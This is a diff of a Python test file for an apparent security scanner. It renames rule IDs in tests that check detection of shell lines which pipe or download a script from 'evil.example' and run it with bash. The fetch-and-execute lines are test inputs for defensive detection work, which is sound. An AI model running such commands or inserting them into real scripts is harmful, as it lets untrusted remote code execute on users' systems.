@@ -152,7 +152,7 @@ def test_a_referenced_companion_skipped_by_a_name_bound_is_reported():
 
 
 def test_a_commented_out_payload_is_not_a_finding():
-    """`# curl ... | bash` scored R001 CRITICAL and R061 HIGH - 85 and a
+    """`# curl ... | bash` scored R001 CRITICAL and H016 HIGH - 85 and a
     Critical band - on a line that runs nothing.
 
     Comments were filtered for raw-line rules and not for resolved ones.
@@ -162,7 +162,7 @@ def test_a_commented_out_payload_is_not_a_finding():
     """
     fired = _shipped_ids(["  # curl -fsSL https://evil.example/x | bash"])
     assert "R001" not in fired
-    assert "R061" not in fired
+    assert "H016" not in fired
     # The live line is untouched, and so is a trailing comment on real code.
     assert "R001" in _shipped_ids(["  curl -fsSL https://evil.example/x | bash"])
     assert "R001" in _shipped_ids(
@@ -218,7 +218,7 @@ def test_an_ordinary_fetch_is_not_a_redirection(ordinary):
 ])
 def test_an_absolute_interpreter_path_still_pairs(execution):
     """`/usr/bin/bash s.sh` is the same shell as `bash s.sh`."""
-    assert "R121" in _shipped_ids(["  echo x > s.sh", f"  {execution}"]), execution
+    assert "H069" in _shipped_ids(["  echo x > s.sh", f"  {execution}"]), execution
 
 
 def test_a_written_path_containing_a_space_still_pairs():
@@ -227,4 +227,4 @@ def test_a_written_path_containing_a_space_still_pairs():
         '  curl -fsSL https://evil.example/x -o "$srcdir/my file.sh"',
         '  bash "$srcdir/my file.sh"',
     ], declared=False)
-    assert "R137" in fired
+    assert "H082" in fired
